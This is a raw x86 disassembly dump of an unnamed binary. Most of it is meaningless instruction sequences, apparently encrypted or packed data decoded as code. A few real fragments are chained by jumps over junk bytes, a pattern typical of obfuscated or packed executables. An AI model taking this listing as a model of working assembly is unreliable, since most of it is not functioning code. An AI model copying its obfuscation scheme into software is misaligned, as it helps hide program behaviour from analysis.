  40f3b6:	fist   DWORD PTR [esi-0x78282b53]
  40f3bc:	jbe    0x40f3de
  40f3be:	sbb    ch,dl
  40f3c0:	jle    0x40f3f1
  40f3c2:	lods   al,BYTE PTR ds:[esi]
  40f3c3:	jbe    0x40f401
  40f3c5:	repnz push ebx
  40f3c7:	data16 fs out 0xb1,al
  40f3cb:	stos   BYTE PTR es:[edi],al
  40f3cc:	lea    ecx,[ebx-0x4]
  40f3cf:	fnstcw WORD PTR [esi+0x36]
  40f3d2:	xlat   BYTE PTR ds:[ebx]
  40f3d3:	pop    ebp
  40f3d4:	pop    edi
  40f3d5:	outs   dx,BYTE PTR ds:[esi]
  40f3d6:	out    dx,al
  40f3d7:	std    
  40f3d8:	mov    dl,0x90
  40f3da:	aas    
  40f3db:	retf   
  40f3dc:	mov    bl,0xd1
  40f3de:	sub    eax,0x85579dac
  40f3e3:	mov    eax,0x41104daa
  40f3e8:	pop    ss
  40f3e9:	mov    DWORD PTR [ebx-0x21],0xcd4955e2
  40f3f0:	push   eax
  40f3f1:	loope  0x40f3de
  40f3f3:	ins    BYTE PTR es:[edi],dx
  40f3f4:	int3   
  40f3f5:	mov    cl,0xc6
  40f3f7:	loope  0x40f457
  40f3f9:	add    eax,ebx
  40f3fb:	pop    ebx
  40f3fc:	leave  
  40f3fd:	ret    0x8
  40f400:	push   ebp
  40f401:	mov    ebp,esp
  40f403:	push   ecx
  40f404:	mov    DWORD PTR ds:0x433827,0x6a14
  40f40e:	push   ecx
  40f40f:	xor    ecx,edx
  40f411:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  40f418:	jmp    0x40f6e7
  40f41d:	call   0xa1f0:0x6df6cd0b
  40f424:	push   ebx
  40f425:	inc    ebx
  40f426:	push   edi
  40f427:	dec    ecx
  40f428:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f429:	or     DWORD PTR [edx+0x72],eax
  40f42c:	or     BYTE PTR [edi-0x53818155],ch
  40f432:	jl     0x40f4b2
  40f434:	jle    0x40f45f
  40f436:	neg    BYTE PTR [ebx+0x5c]
  40f439:	pop    es
  40f43a:	or     DWORD PTR ds:0xfcd188ed,edx
  40f440:	mov    al,ds:0xdcc1e0a1
  40f445:	ret    0xb351
  40f448:	push   edx
  40f449:	sbb    edi,ecx
  40f44b:	mov    al,ds:0xf14884f4
  40f450:	sub    BYTE PTR [edx-0x2173bfb8],ch
  40f456:	jnp    0x40f444
  40f458:	jecxz  0x40f448
  40f45a:	sub    BYTE PTR [ebp+0x62edeb41],0x54
  40f461:	rcr    DWORD PTR [ecx],0x7e
  40f464:	pop    eax
  40f465:	add    BYTE PTR [ebp+0x13],bh
  40f468:	aam    0x52
  40f46a:	sbb    BYTE PTR [edx+0x68],ah
  40f46d:	outs   dx,DWORD PTR ds:[esi]
  40f46e:	jo     0x40f4bb
  40f470:	mov    ch,0x4a
  40f472:	imul   DWORD PTR [edx+0x5e8fa94d]
  40f478:	dec    esi
  40f479:	jnp    0x40f488
  40f47b:	sub    BYTE PTR [esp+eax*8],al
  40f47e:	es push cs
  40f480:	or     eax,0xf92e42e4
  40f485:	mov    dl,0x42
  40f487:	cli    
  40f488:	or     esp,DWORD PTR [esi+0x2a]
  40f48b:	jbe    0x40f471
  40f48d:	sbb    al,0x76
  40f48f:	into   
  40f490:	xor    BYTE PTR [ebp-0x4b],dh
  40f493:	popf   
  40f494:	mov    ch,0x3
  40f496:	es (bad) 
  40f498:	mov    ebx,0x1cf5be
  40f49d:	ror    dl,cl
  40f49f:	sub    ah,BYTE PTR [ebx-0x34]
  40f4a2:	in     eax,0xda
  40f4a4:	test   DWORD PTR [edi],esi
  40f4a6:	sbb    al,0x4
  40f4a8:	mov    ds:0x237728bf,al
  40f4ad:	push   cs
  40f4ae:	(bad)
  40f4b1:	pop    ss
  40f4b2:	nop
  40f4b3:	push   0xffffffe2
  40f4b5:	pop    esi
  40f4b6:	jp     0x40f44f
  40f4b8:	popfw  
  40f4ba:	mov    esi,0xd659b993
  40f4bf:	pop    esp
  40f4c0:	lods   al,BYTE PTR ds:[esi]
  40f4c1:	arpl   WORD PTR [eax],cx
  40f4c3:	pop    edi
  40f4c4:	jp     0x40f48b
  40f4c6:	adc    ax,0x9780
  40f4ca:	mov    bh,0xac
  40f4cc:	dec    edx
  40f4cd:	pop    es
  40f4ce:	mov    eax,ds:0x154dd86d
  40f4d3:	inc    ebx
  40f4d4:	enter  0x5c7b,0x30
  40f4d8:	mov    ah,0x75
  40f4da:	sti    
  40f4db:	inc    esi
  40f4dc:	sar    DWORD PTR [ebx+0xc],1
  40f4df:	in     eax,0xe3
  40f4e1:	jo     0x40f48f
  40f4e3:	push   eax
  40f4e4:	cwde   
  40f4e5:	pop    es
  40f4e6:	xor    DWORD PTR [eax*1+0x238276b6],eax
  40f4ed:	cmp    dh,BYTE PTR [ecx]
  40f4ef:	jecxz  0x40f503
  40f4f1:	out    dx,eax
  40f4f2:	test   BYTE PTR [edi-0x80],al
  40f4f5:	pop    esp
  40f4f6:	aaa    
  40f4f7:	pop    edi
  40f4f8:	push   edi
  40f4f9:	mov    eax,0xa0a20c2b
  40f4fe:	mov    bh,0x6c
  40f500:	cdq    
  40f501:	out    dx,eax
  40f502:	pushf  
  40f503:	cmp    ecx,ecx
  40f505:	xchg   edi,eax
  40f506:	jecxz  0x40f50f
  40f508:	xchg   esi,eax
  40f509:	in     eax,0x2b
  40f50b:	add    BYTE PTR [esi],0xce
  40f50e:	and    ebp,esp
  40f510:	bound  ebx,QWORD PTR [ebx+0x35466aa7]
  40f516:	jae    0x40f55e
  40f518:	mov    dl,0x97
  40f51a:	dec    ebp
  40f51b:	add    al,0xbd
  40f51d:	mov    WORD PTR [edi-0x2e6e8f1b],cs
  40f523:	gs inc ebx
  40f525:	mov    al,0xf2
  40f527:	push   esi
  40f528:	and    ecx,DWORD PTR [edx+eax*4-0x20]
  40f52c:	lods   eax,DWORD PTR ds:[esi]
  40f52d:	push   esp
  40f52e:	ss inc ebx
  40f530:	js     0x40f596
  40f532:	das    
  40f533:	sbb    ebp,0x5dc94ab
  40f539:	scas   eax,DWORD PTR es:[edi]
  40f53a:	push   edi
  40f53b:	aas    
  40f53c:	cdq    
  40f53d:	repz sbb ch,al
  40f540:	jno    0x40f562
  40f542:	test   eax,0x7383975b
  40f547:	sbb    eax,0x692840be
  40f54c:	sar    BYTE PTR [esi],0xec
  40f54f:	outs   dx,DWORD PTR ds:[esi]
  40f550:	inc    ecx
  40f551:	pop    ebp
  40f552:	mov    ah,BYTE PTR [ebx]
  40f554:	jmp    0x4005:0x6012bca5
  40f55b:	iret   
  40f55c:	scas   eax,DWORD PTR es:[edi]
  40f55d:	dec    ebp
  40f55e:	mov    ebx,0xc0926d2f
  40f563:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f564:	and    BYTE PTR [bx+di+0x520f],bl
  40f569:	add    al,0x28
  40f56b:	pop    ebp
  40f56c:	jnp    0x40f540
  40f56e:	fisubr WORD PTR [ecx-0x646ef7be]
  40f574:	clc    
  40f575:	mov    al,ds:0x238ac4b1
  40f57a:	sar    DWORD PTR [esi-0x3a67426b],cl
  40f580:	mov    bl,0x11
  40f582:	fnstcw WORD PTR [ecx+ebx*4]
  40f585:	mov    ch,0x75
  40f587:	fisttp QWORD PTR [ecx+0x19]
  40f58a:	fcomi  st,st(7)
  40f58c:	(bad)  
  40f58e:	int    0x73
  40f590:	fcmovb st,st(2)
  40f592:	cmp    dl,BYTE PTR [eax+0x61513aa4]
  40f598:	popa   
  40f599:	mov    ds:0xc1fc6572,eax
  40f59e:	jg     0x40f556
  40f5a0:	pushf  
  40f5a1:	inc    edi
  40f5a2:	xor    BYTE PTR [esi+0xcd806fb],bl
  40f5a8:	xchg   ebx,eax
  40f5a9:	std    
  40f5aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f5ab:	(bad)  
  40f5ac:	cmp    edi,DWORD PTR [ecx]
  40f5ae:	pusha  
  40f5af:	in     eax,0xb4
  40f5b1:	cwde   
  40f5b2:	and    BYTE PTR [edx-0x37175270],al
  40f5b8:	mov    ecx,0x7104a1a
  40f5bd:	sbb    al,0xa5
  40f5bf:	sub    eax,esp
  40f5c1:	cwde   
  40f5c2:	pop    ebp
  40f5c3:	inc    eax
  40f5c4:	add    al,0x4d
  40f5c6:	lock lods al,BYTE PTR ds:[esi]
  40f5c8:	jo     0x40f55a
  40f5ca:	sub    edx,0x81e4d36e
  40f5d0:	frstor [edx]
  40f5d2:	fs stc 
  40f5d4:	pushf  
  40f5d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f5d6:	popf   
  40f5d7:	mov    esp,0xf17a8563
  40f5dc:	pop    edx
  40f5dd:	cmp    bh,BYTE PTR [edx-0x1edd45f7]
  40f5e3:	loopne 0x40f5fd
  40f5e5:	push   edx
  40f5e6:	pop    ds
  40f5e7:	lahf   
  40f5e8:	iret   
  40f5e9:	(bad)  
  40f5ea:	retf   0xe3c0
  40f5ed:	fucom  st(3)
  40f5ef:	adc    DWORD PTR [eax-0x60],0xffffffab
  40f5f3:	out    0x8b,al
  40f5f5:	push   ecx
  40f5f6:	dec    ecx
  40f5f7:	loope  0x40f620
  40f5f9:	jns    0x40f5aa
  40f5fb:	dec    ebp
  40f5fc:	jmp    0x40f61a
  40f5fe:	lods   eax,DWORD PTR ds:[esi]
  40f5ff:	push   es
  40f600:	lahf   
  40f601:	pop    eax
  40f602:	mov    ecx,0x5b483a6a
  40f607:	aas    
  40f608:	sub    ecx,edi
  40f60a:	inc    ebx
  40f60b:	mov    eax,0x7dd2c83b
  40f610:	call   0xe6c1:0x892414fb
  40f617:	inc    esi
  40f618:	and    DWORD PTR [edi],esp
  40f61a:	bound  ebx,QWORD PTR [eax+0x5e]
  40f61d:	(bad)  
  40f61e:	ins    BYTE PTR es:[edi],dx
  40f61f:	xor    dh,BYTE PTR [edx+0x591765d3]
  40f625:	stc    
  40f626:	ret    0x4ca5
  40f629:	or     al,0xcf
  40f62b:	adc    dh,BYTE PTR [ebp+0x7f]
  40f62e:	in     eax,0xf9
  40f630:	in     eax,0x7a
  40f632:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f633:	sahf   
  40f634:	mov    cl,0xea
  40f636:	jne    0x40f5e4
  40f638:	dec    ecx
  40f639:	int    0xf1
  40f63b:	inc    esp
  40f63c:	(bad)  
  40f63d:	jmp    0x386d26fb
  40f642:	(bad)  
  40f643:	and    DWORD PTR [ecx+0x13],ebx
  40f646:	xor    BYTE PTR [esi],0x70
  40f649:	mov    ah,0x82
  40f64b:	dec    ebp
  40f64c:	and    cl,BYTE PTR [ecx+0x26]
  40f64f:	add    DWORD PTR [ecx+0x9],0xffffffb7
  40f653:	popa   
  40f654:	and    ah,BYTE PTR [esi-0x3c183826]
  40f65a:	outs   dx,DWORD PTR ds:[esi]
  40f65b:	sbb    al,0x5b
  40f65d:	hlt    
  40f65e:	leave  
  40f65f:	cmp    eax,0x5b540f4a
  40f664:	sub    al,0x1a
  40f666:	imul   ebp,DWORD PTR [ebx],0xffffff9e
  40f669:	jp     0x40f63a
  40f66b:	pop    ebx
  40f66c:	sti    
  40f66d:	add    BYTE PTR [esi-0x6c3a4536],al
  40f673:	std    
  40f674:	mov    bh,0xe7
  40f676:	xchg   dl,dl
  40f678:	xchg   ebx,eax
  40f679:	outs   dx,BYTE PTR ds:[esi]
  40f67a:	in     eax,dx
  40f67b:	inc    esi
  40f67c:	call   0x81b3:0x778af747
  40f683:	cdq    
  40f684:	fstp   TBYTE PTR [ebp-0x63b1e7e9]
  40f68a:	push   0x82b8d3df
  40f68f:	pop    ds
  40f690:	add    BYTE PTR [esi+0x56],ch
  40f693:	xor    ecx,DWORD PTR [ebx]
  40f695:	adc    DWORD PTR [esp+eiz*2],0xb604608a
  40f69c:	fwait
  40f69d:	in     al,dx
  40f69e:	inc    esi
  40f69f:	in     al,0x9c
  40f6a1:	sub    DWORD PTR [edx-0x24],ecx
  40f6a4:	mov    ds:0xd52b5ae,al
  40f6a9:	mov    fs,WORD PTR [ebx+esi*2-0x6ccb5817]
  40f6b0:	mov    dh,0x3e
  40f6b2:	cmc    
  40f6b3:	outs   dx,DWORD PTR ds:[esi]
  40f6b4:	add    DWORD PTR [ebx-0x52d3df04],edx
  40f6ba:	sub    al,0x9d
  40f6bc:	jl     0x40f6bb
  40f6be:	inc    ecx
  40f6bf:	fwait
  40f6c0:	mov    ds:0x37adc3a8,al
  40f6c5:	push   ebp
  40f6c6:	enter  0x6f91,0x7d
  40f6ca:	add    BYTE PTR [edx+0xd],bh
  40f6cd:	js     0x40f710
  40f6cf:	fucomi st,st(1)
  40f6d1:	add    bh,BYTE PTR ds:0x7e25cd08
  40f6d7:	jne    0x40f6ab
  40f6d9:	arpl   ax,si
  40f6db:	in     al,dx
  40f6dc:	repnz and DWORD PTR [edx-0xc],ecx
  40f6e0:	push   edx
  40f6e1:	(bad)  
  40f6e2:	(bad)  
  40f6e3:	ja     0x40f6f4
  40f6e5:	or     ch,bl
  40f6e7:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40f6ee:	sub    DWORD PTR ds:0x433827,0x5c72
  40f6f8:	mov    eax,DWORD PTR [ebp-0x4]
  40f6fb:	add    DWORD PTR ds:0x4337e7,0x767c
  40f705:	jmp    0x40f9d4
  40f70a:	ins    BYTE PTR es:[edi],dx
  40f70b:	xchg   BYTE PTR [eax+0x70d870dc],ah
  40f711:	xchg   esi,eax
  40f712:	in     eax,0xdf
  40f714:	or     eax,ebp
  40f716:	in     al,dx
  40f717:	and    edi,0x7eb6dd79
  40f71d:	jle    0x40f6cb
  40f71f:	jl     0x40f79f
  40f721:	jle    0x40f6c3
  40f723:	mov    ebp,0x27a9b4d9
  40f728:	in     eax,0x57
  40f72a:	int3   
  40f72b:	inc    ebp
  40f72c:	or     BYTE PTR [ebp+0x6c],bh
  40f72f:	pop    ebp
  40f730:	mov    ebx,0x28373fc0
  40f735:	and    esp,DWORD PTR [ebp-0x3c797a4c]
  40f73b:	ins    BYTE PTR es:[edi],dx
  40f73c:	pusha  
  40f73d:	mov    dh,0xf6
  40f73f:	mov    ds:0x37a5f10f,eax
  40f744:	sub    BYTE PTR [edi-0x54c64243],al
  40f74a:	int3   
  40f74b:	daa    
  40f74c:	push   ss
  40f74d:	repnz cld 
  40f74f:	dec    esi
  40f750:	(bad)  
  40f751:	xchg   ebx,eax
  40f752:	jmp    0x40f791
  40f754:	and    eax,edx
  40f756:	xor    al,0x8
  40f758:	rcr    DWORD PTR [eax+0x8342f01],1
  40f75e:	xor    al,0x8d
  40f760:	lods   al,BYTE PTR ds:[esi]
  40f761:	and    al,0x18
  40f763:	jo     0x40f743
  40f765:	(bad)  
  40f766:	sbb    esp,DWORD PTR [ebx]
  40f768:	sub    ebx,DWORD PTR [eax+ecx*8]
  40f76b:	shr    BYTE PTR [ebp-0x186a0dbe],cl
  40f771:	add    DWORD PTR [eax],ebx
  40f773:	ins    BYTE PTR es:[edi],dx
  40f774:	mov    dh,0xf9
  40f776:	enter  0x48a7,0x30
  40f77a:	jbe    0x40f7a8
  40f77c:	pop    ss
  40f77d:	int    0xe7
  40f77f:	add    esi,edx
  40f781:	bnd jo 0x40f7bf
  40f784:	shl    DWORD PTR [eax],cl
  40f786:	xchg   esp,eax
  40f787:	not    BYTE PTR [eax-0x6cf4b9fd]
  40f78d:	xchg   DWORD PTR [esp+edx*1+0x39f27146],ebx
  40f794:	dec    eax
  40f795:	adc    ebp,DWORD PTR [ebx-0x1dc9e7ae]
  40f79b:	add    eax,DWORD PTR [esp+ecx*4-0x13]
  40f79f:	adc    ebp,DWORD PTR [edx+0x17]
  40f7a2:	inc    edi
  40f7a3:	mov    edi,0xe10f3e0c
  40f7a8:	mov    esi,0x994ebc8f
  40f7ad:	sbb    DWORD PTR [ebp-0x7d332245],ebp
  40f7b3:	fisttp WORD PTR [edi]
  40f7b5:	(bad)  
  40f7b7:	sbb    BYTE PTR [ecx-0x5b7b76a4],0xbf
  40f7be:	es lahf 
  40f7c0:	ins    BYTE PTR es:[edi],dx
  40f7c1:	sbb    DWORD PTR [esp+ecx*2],esi
  40f7c4:	inc    ebx
  40f7c5:	jbe    0x40f793
  40f7c7:	dec    ecx
  40f7c8:	cmp    al,0x95
  40f7ca:	inc    ebp
  40f7cb:	mov    BYTE PTR [esi-0x35],0x94
  40f7cf:	dec    ebp
  40f7d0:	(bad)  
  40f7d1:	push   0x88350e98
  40f7d6:	dec    ebx
  40f7d7:	out    0x9f,eax
  40f7d9:	sbb    al,0xf9
  40f7db:	es test al,0xab
  40f7de:	jmp    0x9a97a7c9
  40f7e3:	mov    cl,0x69
  40f7e5:	mov    ds:0xaa1723a6,eax
  40f7ea:	sbb    BYTE PTR [eax+0x64dcd0e4],al
  40f7f0:	mov    bh,bl
  40f7f2:	xchg   BYTE PTR [eax+0x118eb233],ah
  40f7f8:	adc    DWORD PTR [ecx-0x3c814003],edi
  40f7fe:	xchg   edi,eax
  40f7ff:	pop    edx
  40f800:	push   ecx
  40f801:	std    
  40f802:	ror    bh,cl
  40f804:	xchg   esi,eax
  40f805:	popa   
  40f806:	and    eax,0x84c17a71
  40f80b:	mov    al,0x44
  40f80d:	mov    ds:0x6fddfbf6,al
  40f812:	inc    edx
  40f813:	add    al,0xc1
  40f815:	mov    dh,0xff
  40f817:	inc    ebx
  40f818:	stos   BYTE PTR es:[edi],al
  40f819:	add    dl,ah
  40f81b:	dec    eax
  40f81c:	call   0xd8c3:0x6371565d
  40f823:	retf   0xa14a
  40f826:	ret    
  40f827:	jge    0x40f7b8
  40f829:	pop    esp
  40f82a:	(bad)  
  40f82b:	(bad)  
  40f82d:	scas   al,BYTE PTR es:[edi]
  40f82e:	test   BYTE PTR [ecx+0x2d],al
  40f831:	mov    gs,WORD PTR [eax]
  40f833:	push   esi
  40f834:	(bad)  
  40f835:	jbe    0x40f84a
  40f837:	cld    
  40f838:	scas   al,BYTE PTR es:[edi]
  40f839:	dec    ecx
  40f83a:	repnz xchg bh,al
  40f83d:	mov    cl,0x13
  40f83f:	pop    ebp
  40f840:	rcl    DWORD PTR [ebx+eax*4+0x22c06add],1
  40f847:	xor    dl,BYTE PTR [edi]
  40f849:	mov    ch,0x6f
  40f84b:	pop    ebp
  40f84c:	inc    esp
  40f84d:	jo     0x40f868
  40f84f:	std    
  40f850:	addr16 push 0xffffffac
  40f853:	stos   BYTE PTR es:[edi],al
  40f854:	jmp    0xd243:0x91401387
  40f85b:	shr    BYTE PTR [esi+0x70d99581],cl
  40f861:	inc    ebx
  40f862:	js     0x40f871
  40f864:	xchg   ebp,eax
  40f865:	push   ss
  40f866:	mov    ah,0xc4
  40f868:	sbb    dl,bh
  40f86a:	lods   eax,DWORD PTR ds:[esi]
  40f86b:	outs   dx,BYTE PTR ds:[esi]
  40f86c:	pop    edi
  40f86d:	fdivr  DWORD PTR [edi+0x51fab6bb]
  40f873:	or     al,0xc6
  40f875:	pop    esp
  40f876:	mov    ah,0xd7
  40f878:	cmp    DWORD PTR [eax+0x1190af65],ebx
  40f87e:	adc    al,0xb7
  40f880:	fbstp  TBYTE PTR [ebx]
  40f882:	ins    DWORD PTR es:[edi],dx
  40f883:	adc    eax,0xdff7dd09
  40f888:	jg     0x40f8af
  40f88a:	scas   eax,DWORD PTR es:[edi]
  40f88b:	dec    ebx
  40f88c:	xor    DWORD PTR [ebx],ebp
  40f88e:	(bad)
  40f891:	mov    dl,0x9c
  40f893:	pop    es
  40f894:	sub    edx,DWORD PTR [ecx-0x14]
  40f897:	pop    ss
  40f898:	lds    edx,FWORD PTR [ecx+ebp*2-0xd]
  40f89c:	pop    ebx
  40f89d:	jmp    0x2268:0xb25830ce
  40f8a4:	ja     0x40f8b2
  40f8a6:	xor    al,0xea
  40f8a8:	xchg   ecx,eax
  40f8a9:	inc    edx
  40f8aa:	jno    0x40f86e
  40f8ac:	pushf  
  40f8ad:	or     edi,DWORD PTR [edi+0x22]
  40f8b0:	pop    esi
  40f8b1:	ins    BYTE PTR es:[edi],dx
  40f8b2:	jae    0x40f850
  40f8b4:	(bad)  
  40f8b5:	cli    
  40f8b6:	clc    
  40f8b7:	fiadd  DWORD PTR [esi]
  40f8b9:	(bad)  
  40f8ba:	xchg   edi,eax
  40f8bb:	mov    ds:0xb00b01d6,eax
  40f8c0:	out    0x19,al
  40f8c2:	push   edi
  40f8c3:	hlt    
  40f8c4:	sti    
  40f8c5:	fdivr  QWORD PTR [edi+eax*2-0x4dc75085]
  40f8cc:	aad    0x8d
  40f8ce:	mov    edx,0x236e33bc
  40f8d3:	test   DWORD PTR [ecx],edx
  40f8d5:	ror    DWORD PTR [ecx+0x2c546672],1
  40f8db:	jb     0x40f8ee
  40f8dd:	push   esi
  40f8de:	jo     0x40f8c7
  40f8e0:	inc    edi
  40f8e1:	loopne 0x40f8f8
  40f8e3:	aaa    
  40f8e4:	daa    
  40f8e5:	and    ebp,DWORD PTR [esi]
  40f8e7:	dec    edx
  40f8e8:	xchg   esi,eax
  40f8e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f8ea:	cmp    BYTE PTR ds:0xd9c3ab56,ah
  40f8f0:	xchg   esp,eax
  40f8f1:	imul   ebp,ebx,0xd256b575
  40f8f7:	mov    bl,0xf4
  40f8f9:	out    0xc0,eax
  40f8fb:	outs   dx,BYTE PTR ds:[esi]
  40f8fc:	jae    0x40f931
  40f8fe:	loope  0x40f91e
  40f900:	xor    bl,BYTE PTR [ebp-0x12eb9f6c]
  40f906:	mov    ds:0x381ea25,eax
  40f90b:	out    0xf9,al
  40f90d:	push   es
  40f90e:	aaa    
  40f90f:	call   0xabc7:0xfa6680f5
  40f916:	push   edi
  40f917:	xchg   ebx,eax
  40f918:	xchg   esi,eax
  40f919:	push   esp
  40f91a:	sar    BYTE PTR [ebx+0x278d9d21],0x62
  40f921:	pop    DWORD PTR [esi+0x22c92de8]
  40f927:	out    0xe0,eax
  40f929:	inc    ebp
  40f92a:	setp   BYTE PTR [edx]
  40f92d:	jmp    0xb7a4:0x9ad70d97
  40f934:	xchg   ecx,eax
  40f935:	(bad)  
  40f936:	jno    0x40f9b7
  40f938:	mov    eax,ds:0xb7d7980f
  40f93d:	lods   eax,DWORD PTR ds:[esi]
  40f93e:	sbb    DWORD PTR [edx],edi
  40f940:	mov    ds,WORD PTR [ebp-0xd9cb347]
  40f946:	mov    edx,0xa6ea3249
  40f94b:	out    dx,al
  40f94c:	jl     0x40f992
  40f94e:	and    ebx,DWORD PTR [eax-0x36433c4d]
  40f954:	ror    BYTE PTR [edx-0x60],1
  40f957:	xor    bl,BYTE PTR [edi]
  40f959:	out    dx,eax
  40f95a:	sbb    eax,0xb827ec1
  40f95f:	mov    ebp,0x6fb51f23
  40f964:	das    
  40f965:	fidiv  DWORD PTR [eax+0x4f7f646d]
  40f96b:	es test al,ah
  40f96e:	aam    0x16
  40f970:	jmp    0xa4b6d314
  40f975:	mov    ecx,0x5ba53a64
  40f97a:	ret    0xe355
  40f97d:	test   ch,cl
  40f97f:	inc    esi
  40f980:	inc    eax
  40f982:	outs   dx,DWORD PTR ds:[esi]
  40f983:	daa    
  40f984:	xor    BYTE PTR [esi+0x1],bh
  40f987:	jb     0x40f9d1
  40f989:	jg     0x40f949
  40f98b:	shl    BYTE PTR [ebx+0x451323eb],1
  40f991:	fs test al,0x17
  40f994:	dec    ebp
  40f995:	cmc    
  40f996:	bound  edi,QWORD PTR [ebp+0x5eb4f173]
  40f99c:	or     al,0x19
  40f99e:	push   ss
  40f99f:	xchg   edi,eax
  40f9a0:	push   cs
  40f9a1:	dec    ecx
  40f9a2:	jmp    0x40f96e
  40f9a4:	iret   
  40f9a5:	imul   esp,DWORD PTR [esi],0xb011a754
  40f9ab:	mov    eax,ds:0xb5b40f59
  40f9b0:	xchg   ecx,eax
  40f9b1:	je     0x40f97b
  40f9b3:	cdq    
  40f9b4:	jle    0x40f9fb
  40f9b6:	out    dx,eax
  40f9b7:	inc    edx
  40f9b8:	and    BYTE PTR [eax+eax*1-0x20943a56],bh
  40f9bf:	iret   
  40f9c0:	std    
  40f9c1:	jge    0x40f99d
  40f9c3:	and    DWORD PTR [esi+0x64cc4ba6],esp
  40f9c9:	mov    ah,BYTE PTR [esi+0x3c]
  40f9cc:	xor    ebp,DWORD PTR ds:0x6ac60297
  40f9d2:	sub    ebp,ecx
  40f9d4:	push   esi
  40f9d5:	adc    esi,DWORD PTR ds:0x433777
  40f9db:	mov    esi,DWORD PTR [ebp-0x8]
  40f9de:	movzx  ecx,BYTE PTR ds:0x43377b
  40f9e5:	adc    DWORD PTR ds:0x433833,ecx
  40f9eb:	mov    edx,0x7510854
  40f9f0:	xor    eax,edx
  40f9f2:	xor    ecx,0x76d3
  40f9f8:	xor    esi,edx
  40f9fa:	mov    ecx,0x32729b
  40f9ff:	jmp    0x40fcce
  40fa04:	mov    eax,ds:0x696d6976
  40fa09:	jno    0x40f9ac
  40fa0b:	jb     0x40fa43
  40fa0d:	inc    eax
  40fa0e:	pop    eax
  40fa0f:	outs   dx,DWORD PTR ds:[esi]
  40fa10:	int3   
  40fa11:	sub    eax,0xb50b211f
  40fa16:	jle    0x40fa96
  40fa18:	lods   al,BYTE PTR ds:[esi]
  40fa19:	jl     0x40fa99
  40fa1b:	jle    0x40fa33
  40fa1d:	jmp    0x40f9c9
  40fa1f:	add    al,0x9d
  40fa21:	xchg   DWORD PTR [ebx+0x17f75016],ebp
  40fa27:	jb     0x40fa39
  40fa29:	xchg   BYTE PTR [ebx],al
  40fa2b:	mov    eax,DWORD PTR [esp+ebp*2-0x3a2158bf]
  40fa32:	dec    eax
  40fa33:	sbb    edi,DWORD PTR [esi+0x319faef2]
  40fa39:	int3   
  40fa3a:	pushf  
  40fa3b:	(bad)  
  40fa3c:	mov    DWORD PTR [edi-0x7de2beae],esi
  40fa42:	mov    eax,DWORD PTR [eax-0x79]
  40fa45:	sub    ch,BYTE PTR [ebp+0x4d]
  40fa48:	stos   DWORD PTR es:[edi],eax
  40fa49:	jle    0x40fac3
  40fa4b:	clc    
  40fa4c:	pushw  ds
  40fa4e:	pop    esi
  40fa4f:	xor    esp,DWORD PTR [esi-0x20]
  40fa52:	out    dx,eax
  40fa53:	fs sbb ecx,ebx
  40fa56:	adc    eax,esi
  40fa58:	fld    DWORD PTR [edi+0x40]
  40fa5b:	stos   BYTE PTR es:[edi],al
  40fa5c:	int3   
  40fa5d:	jp     0x40fad0
  40fa5f:	aad    0x7f
  40fa61:	push   es
  40fa62:	mov    ds:0x86dca185,al
  40fa67:	test   BYTE PTR [edx+0x136f144d],ch
  40fa6d:	jl     0x40facf
  40fa6f:	add    esi,DWORD PTR [eax+eax*1]
  40fa72:	repnz data16 (bad) 
  40fa75:	pop    esi
  40fa76:	or     ebx,DWORD PTR [esi+0x38584765]
  40fa7c:	fisttp DWORD PTR [ebp-0x53f0dc8a]
  40fa82:	mov    al,0x7f
  40fa84:	and    al,0x5d
  40fa86:	bound  ecx,QWORD PTR [edi+0x4ef61a5]
  40fa8c:	fmul   st(5),st
  40fa8e:	cwde   
  40fa8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa90:	popa   
  40fa91:	fs jne 0x40fa68
  40fa94:	cli    
  40fa95:	inc    ecx
  40fa96:	mov    al,0xe
  40fa98:	shr    DWORD PTR [edi-0x3bd1bef5],1
  40fa9e:	mov    dl,0x3b
  40faa0:	test   eax,0x559ac679
  40faa5:	or     bh,BYTE PTR [edx+0x18f46b64]
  40faab:	xor    ah,dl
  40faad:	push   0x526be93
  40fab2:	cmp    cl,0xda
  40fab5:	inc    eax
  40fab6:	fld    TBYTE PTR [edi-0x398b24b0]
  40fabc:	fiadd  WORD PTR [ecx+0x658f27e]
  40fac2:	pop    esp
  40fac3:	jne    0x40fa88
  40fac5:	stos   DWORD PTR es:[edi],eax
  40fac6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fac7:	inc    edi
  40fac8:	pushf  
  40fac9:	push   ds
  40faca:	xchg   BYTE PTR [ecx],dl
  40facc:	sub    DWORD PTR ds:0x3a4d9d5a,esi
  40fad2:	push   eax
  40fad3:	add    eax,0xc713e721
  40fad8:	pop    ds
  40fad9:	mov    bh,0xff
  40fadb:	ss enter 0x1c18,0x8
  40fae0:	jbe    0x40fa78
  40fae2:	arpl   WORD PTR [ebp-0x73922191],si
  40fae8:	test   eax,0x15d39fa5
  40faed:	loopne 0x40fb5d
  40faef:	jp     0x40faca
  40faf1:	mov    BYTE PTR [ecx],ah
  40faf3:	ss pop ebx
  40faf5:	aad    0xbd
  40faf7:	sbb    al,0xc9
  40faf9:	sti    
  40fafa:	sbb    edx,edi
  40fafc:	adc    edx,edx
  40fafe:	es push edi
  40fb00:	mov    esi,0x81935b38
  40fb05:	add    eax,eax
  40fb07:	cld    
  40fb08:	pop    eax
  40fb09:	inc    eax
  40fb0a:	cdq    
  40fb0b:	(bad)  
  40fb0c:	fsubr  st(3),st
  40fb0e:	pop    ebx
  40fb0f:	sar    BYTE PTR [ebp+0x75],cl
  40fb12:	adc    ch,bl
  40fb14:	ret    
  40fb15:	xor    BYTE PTR [ebp+0x37],0x2d
  40fb19:	sub    eax,0x6c10369d
  40fb1e:	cmp    DWORD PTR [edx-0x18],ecx
  40fb21:	pop    esi
  40fb22:	sbb    al,0x80
  40fb24:	call   0x2fee:0x85aa12f3
  40fb2b:	pop    edi
  40fb2c:	mov    bh,0xf4
  40fb2e:	out    dx,eax
  40fb2f:	dec    edi
  40fb30:	pop    eax
  40fb31:	mov    DWORD PTR [edx],edi
